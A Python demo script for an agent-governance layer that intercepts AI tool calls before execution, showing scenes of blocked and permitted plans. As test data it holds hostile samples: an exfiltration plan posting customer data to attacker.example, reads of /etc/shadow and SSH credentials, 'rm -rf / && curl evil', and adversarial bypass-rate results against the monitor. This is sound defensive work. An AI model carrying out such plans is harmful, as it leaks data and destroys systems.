#!/usr/bin/env python3
"""
Morrison Runtime Governance — Quickstart Demo

  python3 quickstart.py                       # instant, plain output
  python3 quickstart.py --cinematic           # paced, polished, screen-recordable
  python3 quickstart.py --cinematic --fast    # cinematic visuals, shorter pauses

Same governance logic as the deterministic test suite. This file is the
presentation layer only — verdicts, mechanisms, layer attributions, and
evaluation numbers all come directly from the unchanged morrison_governance
core. Standard library only; works in a local terminal, Google Colab, and
GitHub Codespaces. ANSI colour and box-drawing characters are used when
the runtime supports them and gracefully fall back to plain ASCII otherwise.
"""

import os
import sys
import time

sys.path.insert(0, __file__.rsplit("/", 1)[0] or ".")

from morrison_governance import (
    GovernanceLayer, OmegaDomain, OmegaRule,
    resource_scope, goal_uses_tool, permission_drift,
)

# ─────────────────────────── flags ───────────────────────────
CINEMATIC = "--cinematic" in sys.argv
FAST      = "--fast" in sys.argv
WIDTH     = 78

# ────────── encoding + colour capability detection ──────────
def _supports_utf8() -> bool:
    return "utf" in (sys.stdout.encoding or "").lower()


def supports_color() -> bool:
    """ANSI colours: enabled on a TTY (unless NO_COLOR / not a terminal)."""
    if os.environ.get("NO_COLOR"):
        return False
    if os.environ.get("FORCE_COLOR"):
        return True
    if not sys.stdout.isatty():
        return False
    if sys.platform == "win32":
        return bool(os.environ.get("WT_SESSION") or os.environ.get("ANSICON"))
    return True


USE_UTF8  = _supports_utf8()
USE_COLOR = supports_color()

# ──────────── symbol set (utf-8 with ASCII fallback) ────────
if USE_UTF8:
    HBAR, HBOLD = "─", "═"
    CHECK, XMARK = "✓", "✗"
    LA, RA, DA = "◀", "▶", "▼"
    OMEGA, RSCRIPT, ESCRIPT = "Ω", "ℛ", "ℰ"
    FORALL, ELEM, CAP, IFF, EMPTY = "∀", "∈", "∩", "⇔", "∅"
    BAR  = "█"
    DOT  = "·"
    BULL = "•"
    ARROW = "→"
    BTL, BTR, BBL, BBR = "┌", "┐", "└", "┘"
    BH, BV = "─", "│"
else:
    HBAR, HBOLD = "-", "="
    CHECK, XMARK = "OK", "X"
    LA, RA, DA = "<", ">", "v"
    OMEGA, RSCRIPT, ESCRIPT = "Omega", "R", "E"
    FORALL, ELEM, CAP, IFF, EMPTY = "for-all", "in", "intersect", "iff", "{}"
    BAR  = "#"
    DOT  = "."
    BULL = "*"
    ARROW = "->"
    BTL, BTR, BBL, BBR = "+", "+", "+", "+"
    BH, BV = "-", "|"

# ─────────────────────── colour helpers ─────────────────────
_STYLES = {
    "bold": "1", "dim": "2", "underline": "4", "reverse": "7",
    "red": "31", "green": "32", "yellow": "33", "blue": "34",
    "cyan": "36", "white": "37",
    "bright_red": "91", "bright_green": "92", "bright_yellow": "93",
    "bright_blue": "94", "bright_cyan": "96",
}


def c(text: str, style: str = "") -> str:
    """Wrap `text` in ANSI styles. `style` is a comma-separated list
    (e.g. 'bold,bright_red'). Gracefully passes through when colour is
    unavailable, so the same call site works on every runtime."""
    if not USE_COLOR or not style:
        return text
    codes = [_STYLES[s.strip()] for s in style.split(",")
             if s.strip() in _STYLES]
    if not codes:
        return text
    return f"\x1b[{';'.join(codes)}m{text}\x1b[0m"


def chip(label: str, color: str) -> str:
    """Branded verdict chip: bold + bright colour with `[ label ]`
    brackets. Falls back to `[ label ]` plain when colour is unavailable."""
    if not USE_COLOR:
        return f"[ {label} ]"
    bright = {"red": "bright_red", "green": "bright_green",
              "yellow": "bright_yellow", "cyan": "bright_cyan",
              "blue": "bright_blue"}.get(color, color)
    return c(f"[ {label} ]", f"bold,{bright}")


# ───────────────────────── pacing ───────────────────────────
def pause(seconds: float = 1.0) -> None:
    """Sleep only in cinematic mode. `--fast` caps the wait so the demo
    keeps its visual rhythm without being annoying to re-run."""
    if not CINEMATIC:
        return
    time.sleep(min(seconds, 0.18) if FAST else seconds)


# ─────────────────── layout primitives ──────────────────────
def hrule(char: str = None, style: str = "dim") -> None:
    print(c((char or HBAR) * WIDTH, style))


def scene(num: str, title: str, subtitle: str = None) -> None:
    """Scene header with clear spacing — easy to land on in a screencap."""
    print()
    print()
    hrule()
    badge = c(f"  SCENE {num}", "bold,dim")
    print(badge + "   " + c(title, "bold,cyan"))
    if subtitle:
        print(c(f"  {subtitle}", "dim"))
    hrule()
    print()
    pause(0.6)


def section(title: str) -> None:
    print()
    print(c(f"  {title}", "bold"))
    print(c("  " + HBAR * min(len(title) + 2, WIDTH - 2), "dim"))


def status(label: str, verdict_label: str, color: str,
           mechanism: str = None) -> None:
    """One-line scene status — chip, label, optional mechanism."""
    line = f"  {chip(verdict_label, color)}  {label}"
    if mechanism:
        line += "  " + c(f"{BULL} {mechanism}", "dim")
    print(line)


def row(layer: str, mechanism: str, verdict_label: str, color: str,
        layer_w: int = 6, mech_w: int = 44) -> None:
    """Scorecard row. Long mechanism strings are truncated cleanly so
    the chip column stays aligned across rows."""
    mech = (mechanism[:mech_w - 1] + "…") if len(mechanism) > mech_w \
        else mechanism
    layer_col = c(layer.ljust(layer_w), "bold,cyan")
    print(f"  {layer_col}  {mech:<{mech_w}}  "
          f"{chip(verdict_label, color)}")


# ──────────────────── opening + summary banners ─────────────
def banner(title: str, subtitle: str = None) -> None:
    print()
    bar = c(HBOLD * WIDTH, "bright_blue")
    print(bar)
    print("  " + c(title.center(WIDTH - 4), "bold,white"))
    if subtitle:
        print("  " + c(subtitle.center(WIDTH - 4), "dim"))
    print(bar)


def opening() -> None:
    banner("MORRISON RUNTIME GOVERNANCE",
           "pre-execution control for tool-using AI agents")
    pause(1.1)


# ─────────────────────── architecture ───────────────────────
def architecture() -> None:
    scene("0", "Architecture",
          f"Agent  {ARROW}  Governance Layer  {ARROW}  Tool Runtime")

    if USE_UTF8:
        lines = [
            "  ┌──────────────────┐    propose      ┌─────────────────────────────────┐",
            "  │                  │    tool call    │  GOVERNANCE LAYER               │",
            "  │   AGENT /        │                 │  ─────────────────────────────  │",
            "  │   PLANNER        │  ─────────────▶ │  A_safe   single-step Ω         │",
            "  │                  │                 │  V2       source→sink + drift   │",
            "  │  (LLM, planner)  │                 │  V3       forward reachability  │",
            "  │                  │                 │  V4       admissibility         │",
            "  └──────────────────┘                 │  V4+      NO_VALID_SOLUTION     │",
            "                                       │  V5       env perturbation      │",
            "      PERMIT ◀────────────────────────│  V5+      adversarial container │",
            "         │                             │                                 │",
            "         │             BLOCK ◀────────│                                 │",
            "         ▼                 │           └─────────────────────────────────┘",
            "  ┌──────────────────┐     │",
            "  │   TOOL           │     └── denied — never reaches the tool runtime",
            "  │   RUNTIME        │",
            "  │                  │     Invariant",
            "  │  (shell · API ·  │          Safe ⇔  ∀ E ∈ ℰ,  ℛ_E(t) ∩ Ω = ∅",
            "  │   fs · browser)  │",
            "  └──────────────────┘",
        ]
    else:
        lines = [
            "  +------------------+    propose      +---------------------------------+",
            "  |                  |    tool call    |  GOVERNANCE LAYER               |",
            "  |   AGENT /        |                 |  -----------------------------  |",
            "  |   PLANNER        |  -------------> |  A_safe   single-step Omega     |",
            "  |                  |                 |  V2       source->sink + drift  |",
            "  |  (LLM, planner)  |                 |  V3       forward reachability  |",
            "  |                  |                 |  V4       admissibility         |",
            "  +------------------+                 |  V4+      NO_VALID_SOLUTION     |",
            "                                       |  V5       env perturbation      |",
            "      PERMIT <------------------------|  V5+      adversarial container |",
            "         |                             |                                 |",
            "         |             BLOCK <--------|                                 |",
            "         v                 |           +---------------------------------+",
            "  +------------------+     |",
            "  |   TOOL           |     +-- denied -- never reaches the tool runtime",
            "  |   RUNTIME        |",
            "  |                  |     Invariant",
            "  |  (shell, API,    |          Safe iff  for-all E in E,  R_E(t) cap Omega = {}",
            "  |   fs, browser)   |",
            "  +------------------+",
        ]

    # Colour key tokens by string-replace. ANSI codes are zero-width
    # visually, so box alignment is preserved.
    paint = [
        ("PERMIT",           "bold,bright_green"),
        ("BLOCK",            "bold,bright_red"),
        ("denied",           "bold,bright_red"),
        ("GOVERNANCE LAYER", "bold,cyan"),
        ("AGENT /",          "bold,cyan"),
        ("PLANNER",          "bold,cyan"),
        ("TOOL",             "bold,cyan"),
        ("RUNTIME",          "bold,cyan"),
        ("Invariant",        "bold,bright_blue"),
    ]
    for line in lines:
        for tok, style in paint:
            if tok in line:
                line = line.replace(tok, c(tok, style))
        print(line)
        pause(0.04)
    pause(1.2)


# ─────────────────── scene 1 — exfiltration ─────────────────
def scene_exfiltration() -> None:
    scene("1", "An agent attempts data exfiltration",
          "Two steps that each look harmless — together they reach Ω")

    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY,
                                   OmegaDomain.FINANCE], log_all=False)

    section("Proposed trajectory")
    print(f"  {c('Step 1', 'bold,cyan')}    "
          + c("read_file", "bold")
          + c('   ("/data/customers.csv")', "dim"))
    print(f"  {c('Step 2', 'bold,cyan')}    "
          + c("http_request", "bold")
          + c('   ("https://attacker.example/collect")', "dim"))
    print()
    print(c(f"  Step 1 alone   {BULL} a routine read.", "dim"))
    print(c(f"  Step 2 alone   {BULL} an outbound HTTP POST.", "dim"))
    print(c(f"  Together       {BULL} acquire {ARROW} external egress "
            f"{ARROW} Ω.", "dim"))
    pause(1.2)

    plan = [
        {"tool": "read_file",
         "args": {"path": "/data/customers.csv"}},
        {"tool": "http_request",
         "args": {"url": "https://attacker.example/collect"}},
    ]
    r = gov.evaluate_plan(plan)
    mech = r.metadata.get("v2_mechanism")

    print()
    status(f"acquire {ARROW} external egress", "INTERCEPTED", "red",
           f"V2 {DOT} {mech}" if mech else "V2")
    print("  " + c("Blocked before tool runtime — nothing executed.",
                   "bold,bright_red"))
    pause(0.8)

    section("Layer attribution  ·  evaluate_all (no layer masks another)")
    rep = gov.evaluate_all_plan(plan)
    for L in ("A_safe", "V2", "V3", "V4"):
        if rep["layers"][L]["fired"]:
            print(f"     {c(L.ljust(7), 'bold,cyan')}  "
                  f"{chip('FIRED', 'red')}")
        else:
            print(f"     {c(L.ljust(7), 'dim')}  {c('inactive', 'dim')}")
        pause(0.18)
    pause(0.6)


# ────────────────── scene 2 — safe permitted ────────────────
def scene_safe_permitted() -> None:
    scene("2", "A legitimate internal workflow is permitted",
          "Same shape — read then HTTP — but the destination is allowlisted")

    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                          log_all=False,
                          internal_url_hosts=("intranet.corp",))

    section("Proposed trajectory")
    print(f"  {c('Step 1', 'bold,cyan')}    "
          + c("read_file", "bold")
          + c('   ("/data/q3.csv")', "dim"))
    print(f"  {c('Step 2', 'bold,cyan')}    "
          + c("http_request", "bold")
          + c('   ("https://intranet.corp/upload")', "dim"))
    print()
    print(c(f"  Destination is on the internal allowlist "
            f"{BULL} intranet.corp", "dim"))
    pause(0.9)

    r = gov.evaluate_plan([
        {"tool": "read_file",
         "args": {"path": "/data/q3.csv"}},
        {"tool": "http_request",
         "args": {"url": "https://intranet.corp/upload"}},
    ])
    print()
    status(f"acquire {ARROW} allowlisted internal sink",
           "PERMITTED", "green")
    print("  " + c("Governance is not a blanket deny — legitimate work "
                   "proceeds.", "bold,bright_green"))
    pause(0.6)


# ─────────────────── scene 3 — layer tour ───────────────────
def scene_layer_tour() -> None:
    scene("3", "Every enforcement layer fires",
          "Each layer evaluated independently — none masks another")

    section(f"Layer scorecard  ·  Layer {DOT} Mechanism {DOT} Verdict")

    # A_safe
    gov_f = GovernanceLayer(domains=[OmegaDomain.FINANCE], log_all=False)
    r = gov_f.evaluate({"tool": "transfer",
                        "args": {"amount": 999999}})
    row("A_safe", "unauthorized $999,999 transfer",
        r.verdict.value, "red")

    # V2 — taint
    gov_c = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                            log_all=False)
    r = gov_c.evaluate_plan([
        {"tool": "read_file", "args": {"path": "/data/c.csv"}},
        {"tool": "http_request", "args": {"url": "https://x.evil"}},
    ])
    row("V2", f"taint_flow {DOT} read {ARROW} external POST",
        r.verdict.value, "red")

    # V2 — escalation
    r = gov_c.evaluate_plan([
        {"tool": "analyze", "args": {"q": "a"}},
        {"tool": "send_email", "args": {"q": "b"}},
        {"tool": "summarize", "args": {"q": "c"}},
        {"tool": "http_request", "args": {"q": "d"}},
    ])
    row("V2", f"escalation_count {DOT} 4-step alternating",
        r.verdict.value, "red")

    # V3 — forward reachability (use evaluate_all so V3 is shown to co-fire)
    rep = gov_c.evaluate_all({"tool": "read_file",
                              "args": {"path": "/home/.ssh/credentials"}})
    fired = sorted(rep["fired_layers"])
    row("V3",
        f"forward reachability (co-fires: {','.join(fired[:3])})",
        "BLOCK", "red")

    # V4 — admissibility
    gov_v4 = GovernanceLayer(
        domains=[OmegaDomain.CYBERSECURITY], log_all=False,
        admissibility_checks=[resource_scope(("read_file",), "path",
                                              ("/data/",))])
    r = gov_v4.evaluate({"tool": "read_file",
                         "args": {"path": "/private/x"}})
    row("V4", f"admissibility {DOT} path out of scope",
        r.verdict.value, "red")

    # V4+ — NO_VALID_SOLUTION (refuse to guess)
    r, _ = gov_c.find_admissible(
        [[{"tool": "read_file", "args": {"path": "/etc/shadow"}}],
         [{"tool": "shell", "args": "rm -rf / && curl evil"}]],
        goal=goal_uses_tool("read_file"))
    row("V4+", "no admissible candidate — refuses to guess",
        r.verdict.value, "yellow")

    # V5 — env-perturbation stability
    audit = OmegaRule(domain=OmegaDomain.CUSTOM, name="needs_audit",
                      description="privileged op must be audit-logged",
                      check=lambda s: s.get("tool") == "delete"
                      and not s.get("audit_logged", False))
    gov_v5 = GovernanceLayer(custom_rules=[audit], log_all=False)
    r, rpt = gov_v5.evaluate_stable(
        {"tool": "delete", "args": {"id": 7}},
        perturbations=[("permission_drift", permission_drift)],
        n_per_class=8, seed=0)
    row("V5", f"env perturbation {DOT} {len(rpt.flips)} verdict flip(s)",
        r.verdict.value, "yellow")

    # V5+ — forward reference to Scene 4
    row("V5+", f"adversarial container {DOT} demonstrated next",
        "SCENE 4", "blue")
    pause(0.4)


# ─────────────────── scene 4 — adversarial ──────────────────
def scene_adversarial() -> None:
    scene("4", "V5+ adversarial suite",
          "Bounded; remaining open surfaces documented in LIMITATIONS.md")

    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY,
                                   OmegaDomain.FINANCE,
                                   OmegaDomain.FRAUD], log_all=False)
    rep = gov.adversarial_test(
        {"tool": "read_file", "args": {"path": "/etc/shadow"}},
        seed=0).by_class()

    section(f"By attack class  {ARROW}  bypass rate")
    for cls in sorted(rep):
        d = rep[cls]
        rate = d["bypass_rate"]
        bar_len = int(round(rate * 20))
        if cls == "multi_turn_chain":
            bar_color = "bright_green"
            flag = "  " + c(f"{CHECK} FIXED  (100% {ARROW} 0%)",
                            "bold,bright_green")
        elif rate >= 0.5:
            bar_color = "bright_red"
            flag = "  " + c("open surface", "yellow")
        elif rate > 0:
            bar_color = "yellow"
            flag = ""
        else:
            bar_color = "bright_green"
            flag = ""
        filled = c(BAR * bar_len, bar_color)
        empty  = c(DOT * (20 - bar_len), "dim")
        print(f"  {cls:<20s}  {rate:>4.0%}  |{filled}{empty}|{flag}")
        pause(0.28)

    print()
    print(c("  Bounded framing", "bold,dim"))
    print(c(f"  {BULL} multi_turn_chain regressed from 100% to 0% "
            f"after the V2 data-flow taint fix.", "dim"))
    print(c(f"  {BULL} Remaining open surfaces are documented in "
            f"LIMITATIONS.md — not a universal-security claim.", "dim"))
    pause(0.9)


# ─────────────────── scene 5 — determinism ──────────────────
def scene_determinism() -> bool:
    scene("5", "Deterministic replay verified",
          f"Same plan {ARROW} same verdict {ARROW} same layer "
          f"{ARROW} same trajectory hash")

    gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                          log_all=False)
    plan = [
        {"tool": "read_file",
         "args": {"path": "/data/customers.csv"}},
        {"tool": "http_request",
         "args": {"url": "https://attacker.example"}},
    ]

    section(f"Forensic replay  {ARROW}  three independent evaluations")
    sigs = []
    for i in (1, 2, 3):
        r = gov.evaluate_plan(plan)
        sig = (r.verdict.value, r.layer,
               r.metadata.get("v2_mechanism"), r.trajectory_hash)
        sigs.append(sig)
        v_chip = chip(sig[0], "red")
        print(f"  {c('run ' + str(i), 'bold')}    {v_chip}  "
              f"layer={c(sig[1], 'cyan')}   "
              f"mech={c(str(sig[2]), 'dim')}")
        print(f"           {c('hash', 'dim')}  "
              f"{c(sig[3], 'bright_cyan')}")
        pause(0.5)

    ok = len(set(sigs)) == 1
    print()
    if ok:
        print(f"  {chip('VERIFIED', 'green')}  "
              + c("Deterministic replay verified.",
                  "bold,bright_green"))
    else:
        print(f"  {chip('FAILED', 'red')}  "
              + c("Replay diverged — NON-DETERMINISTIC.",
                  "bold,bright_red"))
    pause(0.9)
    return ok


# ─────────────────── final dashboard ────────────────────────
def final_dashboard(replay_ok: bool) -> None:
    print()
    print()
    banner("FINAL DASHBOARD")
    print()

    rows_data = [
        ("Exfiltration attempt",      "INTERCEPTED",            "red"),
        ("Safe internal workflow",    "PERMITTED",              "green"),
        ("Enforcement layers",        "ATTRIBUTED",             "cyan"),
        ("Hard adversarial surface",
         "CONTAINED" + ("" if not USE_UTF8 else "") + " · BOUNDED",
         "yellow"),
        ("Deterministic replay",
         "VERIFIED" if replay_ok else "FAILED",
         "green" if replay_ok else "red"),
    ]
    label_w = max(len(label) for label, _, _ in rows_data)
    for label, verdict, color in rows_data:
        pad = label_w - len(label) + 2
        dots = c("." * pad, "dim")
        print(f"  {label} {dots}  {chip(verdict, color)}")
        pause(0.22)

    print()
    print("  " + c("Governance executed before runtime.",
                   "bold,bright_cyan"))
    print("  " + c("Unsafe trajectories never reached tool execution.",
                   "bold,bright_cyan"))
    print()
    print(c("  Next:  morrison_governance/DEPLOYMENT.md",
            "dim"))
    print(c("         (LangChain, OpenAI, AutoGen, Claude, MCP, "
            "browser, shell)", "dim"))
    print()


# ───────────────────────────── main ──────────────────────────
def main() -> None:
    opening()
    architecture()
    scene_exfiltration()
    scene_safe_permitted()
    scene_layer_tour()
    scene_adversarial()
    replay_ok = scene_determinism()
    final_dashboard(replay_ok)
    sys.exit(0 if replay_ok else 1)


if __name__ == "__main__":
    main()
